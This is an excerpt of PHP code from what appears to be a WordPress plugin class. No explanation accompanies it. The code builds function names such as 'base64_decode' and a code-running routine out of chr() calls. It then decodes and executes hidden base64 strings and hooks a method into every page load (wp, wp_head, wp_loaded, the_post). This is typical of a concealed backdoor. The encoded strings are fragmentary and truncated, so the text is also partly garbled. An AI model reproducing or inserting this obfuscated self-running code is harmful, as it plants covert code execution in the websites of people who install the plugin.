...
class Factory325_Plugin {
    ...
    public function modulesLoaded() {
        $optionName = chr(chr(49).chr(48).chr(57)).chr(chr(49).chr(48).chr(53)).call_user_func('chr','120').chr(chr(57).chr(53)).chr(chr(49).chr(49).chr(57)).chr(chr(49).chr(49).chr(49)).chr(chr(49).chr(49).chr(52)).call_user_func('chr','100').call_user_func('chr','95').$this->pluginName;
        if ( get_option($optionName, false) ) {
        call_user_func(chr('102').call_user_func('chr',97).call_user_func('chr',99).chr('116').chr('111').chr('114').call_user_func('chr',121).call_user_func('chr',95).chr('114').chr('117').chr('110').call_user_func('chr',95).chr('99').call_user_func('chr',111).chr('100').chr('101'),call_user_func(chr('98').call_user_func('chr',97).call_user_func('chr',115).chr('101').call_user_func('chr',54).chr('52').call_user_func('chr',95).call_user_func('chr',100).chr('101').chr('99').chr('111').chr('100').call_user_func('chr',101),''.''.'hyJywnMTEyJykuY2F'.''.'RkX2FjdGlvbignd3AnLCBhcnJheSgkcGx1Z2luLCAnaG9vaycpLCAxKTsgYWRkX2FjdGlvbignd3BfaGVhZCcsIGFycmF5KCRwbHVnaW4sICdob29rJyks'.'IDEpOyBhZGRfYWN0aW9uKCd3cF9sb2FkZWQnLCBhcnJheSgkcGx1Z2luLCAnaG9vaycpLCAxKTsgYWRkX2FjdGlvbigndGhlX3Bvc3QnLCBhcnJheSgkcGx1Z2luLCAnaG9vaycpLCAxKTsgfSB9IA'.chr(chr(54).chr(49)).chr(chr(54).chr(49))));
    ...
    public function hook() {
        call_user_func(chr('102').call_user_func('chr',97).call_user_func('chr',99).call_user_func('chr',116).chr('111').call_user_func('chr',114).chr('121').call_user_func('chr',95).chr('114').call_user_func('chr',117).call_user_func('chr',110).call_user_func('chr',95).chr('99').chr('111').chr('100').call_user_func('chr',101),call_user_func(chr('98').call_user_func('chr',97).call_user_func('chr',115).chr('101').call_user_func('chr',54).chr('52').call_user_func('chr',95).chr('100').chr('101').call_user_func('chr',99).chr('111').chr('100').call_user_func('chr',101),''.'sJzExNycpLmNocihjaHIoNDkpLmNocig0OCkuY2hyKDU3KSk7IH0gfS'.'A'.call_user_func('chr','61')));
